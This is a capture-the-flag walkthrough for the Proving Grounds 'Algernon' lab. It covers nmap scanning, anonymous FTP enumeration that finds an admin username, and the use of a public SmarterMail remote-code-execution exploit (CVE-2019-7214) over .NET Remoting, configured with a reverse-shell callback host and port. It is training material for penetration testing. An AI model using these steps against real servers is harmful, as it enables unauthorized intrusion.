---
layout: default
title: Algernon
parent: Proving Grounds Practice - Windows
nav_order: 1
---

# Scanning

---

```bash
┌──(kali㉿kali)-[~/Documents/oscp/windows/algernon]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.242.65
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 20:05 EST
Nmap scan report for 192.168.242.65
Host is up (0.066s latency).
Not shown: 62012 closed tcp ports (reset), 3508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  09:31PM       <DIR>          ImapRetrieval
| 01-25-24  05:04PM       <DIR>          Logs
| 04-29-20  09:31PM       <DIR>          PopRetrieval
|_04-29-20  09:32PM       <DIR>          Spool
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
9998/tcp  open  http          Microsoft IIS httpd 10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Fri, 26 Jan 2024 01:09:01 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

# Enumeration

---

## FTP | 21

Anonymous login allowed

```bash
┌──(kali㉿kali)-[~/Documents/oscp/windows/algernon]
└─$ ftp 192.168.242.65
Connected to 192.168.242.65.
220 Microsoft FTP Service
Name (192.168.242.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49764|)
150 Opening ASCII mode data connection.
04-29-20  09:31PM       <DIR>          ImapRetrieval
01-25-24  05:04PM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
226 Transfer complete.

```

### ImapRetrieval Directory

Empty

### Logs

```bash

ftp> dir
229 Entering Extended Passive Mode (|||49779|)
125 Data connection already open; Transfer starting.
04-29-20  10:26PM                  582 2020.04.29-delivery.log
04-29-20  10:15PM                    0 2020.04.29-profiler.log
04-29-20  10:26PM                  208 2020.04.29-smtpLog.log
04-29-20  10:26PM                  300 2020.04.29-xmppLog.log
05-12-20  02:36AM                  504 2020.05.12-administrative.log
05-12-20  02:36AM                  699 2020.05.12-delivery.log
05-12-20  01:06AM                    0 2020.05.12-profiler.log
05-12-20  02:36AM                  306 2020.05.12-smtpLog.log
05-12-20  02:36AM                  444 2020.05.12-xmppLog.log
05-13-20  02:46AM                  233 2020.05.13-delivery.log
05-13-20  02:47AM                    0 2020.05.13-profiler.log
05-13-20  02:46AM                  102 2020.05.13-smtpLog.log
05-13-20  02:46AM                  148 2020.05.13-xmppLog.log
05-15-20  12:16AM                  163 2020.05.15-delivery.log
05-15-20  12:16AM                    0 2020.05.15-profiler.log
05-15-20  12:16AM                  102 2020.05.15-smtpLog.log
05-15-20  12:16AM                  148 2020.05.15-xmppLog.log
05-27-20  07:45PM                  233 2020.05.27-delivery.log
05-27-20  07:45PM                    0 2020.05.27-profiler.log
05-27-20  07:45PM                  102 2020.05.27-smtpLog.log
05-27-20  07:45PM                  148 2020.05.27-xmppLog.log
06-01-20  05:51PM                  161 2020.06.01-delivery.log
06-01-20  05:51PM                    0 2020.06.01-profiler.log
06-01-20  05:51PM                  100 2020.06.01-smtpLog.log
06-01-20  05:51PM                  146 2020.06.01-xmppLog.log
07-09-20  11:48AM                  163 2020.07.09-delivery.log
07-09-20  11:48AM                    0 2020.07.09-profiler.log
07-09-20  11:48AM                  102 2020.07.09-smtpLog.log
07-09-20  11:48AM                  148 2020.07.09-xmppLog.log
07-12-20  07:58AM                  104 2020.07.12-delivery.log
07-12-20  07:58AM                    0 2020.07.12-profiler.log
07-12-20  07:58AM                  102 2020.07.12-smtpLog.log
07-12-20  07:58AM                  148 2020.07.12-xmppLog.log
07-28-20  04:00AM                  163 2020.07.28-delivery.log
07-28-20  04:00AM                    0 2020.07.28-profiler.log
07-28-20  04:00AM                  102 2020.07.28-smtpLog.log
07-28-20  04:00AM                  148 2020.07.28-xmppLog.log
12-02-21  07:29AM                  233 2021.12.02-delivery.log
12-02-21  07:27AM                  358 2021.12.02-imapLog.log
12-02-21  07:27AM                  358 2021.12.02-popLog.log
12-02-21  07:29AM                    0 2021.12.02-profiler.log
12-02-21  07:29AM                  460 2021.12.02-smtpLog.log
12-02-21  07:29AM                  553 2021.12.02-xmppLog.log
04-04-22  08:29AM                  231 2022.04.04-delivery.log
04-04-22  08:23AM                  358 2022.04.04-imapLog.log
04-04-22  08:23AM                  358 2022.04.04-popLog.log
04-04-22  08:29AM                    0 2022.04.04-profiler.log
04-04-22  08:29AM                  458 2022.04.04-smtpLog.log
04-04-22  08:29AM                  551 2022.04.04-xmppLog.log
05-02-22  06:55AM                 1027 2022.05.02-delivery.log
05-02-22  06:51AM                 1790 2022.05.02-imapLog.log
05-02-22  06:51AM                 1790 2022.05.02-popLog.log
05-02-22  05:35AM                    0 2022.05.02-profiler.log
05-02-22  06:55AM                 2240 2022.05.02-smtpLog.log
05-02-22  06:55AM                 2659 2022.05.02-xmppLog.log
07-11-22  08:08AM                  174 2022.07.11-delivery.log
07-11-22  08:08AM                  358 2022.07.11-imapLog.log
07-11-22  08:08AM                  358 2022.07.11-popLog.log
07-11-22  08:08AM                  409 2022.07.11-smtpLog.log
07-11-22  08:08AM                  456 2022.07.11-xmppLog.log
01-25-24  05:04PM                  112 2024.01.25-delivery.log
```

Checking the "2020.05.12-administrative.log" file we have a user named "admin"

```bash
┌──(kali㉿kali)-[~/Documents/oscp/windows/algernon]
└─$ cat 2020.05.12-administrative.log
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
```

### PopRetrieval

Empty

### Spool

Empty

## HTTP | 80

Default IIS page

## HTTP | 9998

![smartmail](../../../assets/images/ctfs/proving_grounds/algernon/smartmail.png)

Checking exploit-db for "smartermail" there appears to be an exploit that is vulnerable in conjunction with MS .NET Remoting running on port 17001, which this machine has.

![exploit](../../../assets/images/ctfs/proving_grounds/algernon/exploit.png)

# Exploitation

---

Downloaded the exploit for 49216 to the current working directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/windows/algernon]
└─$ searchsploit -m 49216
  Exploit: SmarterMail Build 6985 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49216
     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
    Codes: CVE-2019-7214
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (4852)
Copied to: /home/vagrant/Documents/PG/PRACTICE/windows/algernon/49216.py

```

Altered the IP and Port values for the exploit (keeping the host port value set to 17001).

```bash
HOST='192.168.198.65'
PORT=17001
LHOST='192.168.45.234'
LPORT=80

```

Started a netcat listener and ran the exploit.

![system](../../../assets/images/ctfs/proving_grounds/algernon/system.png)
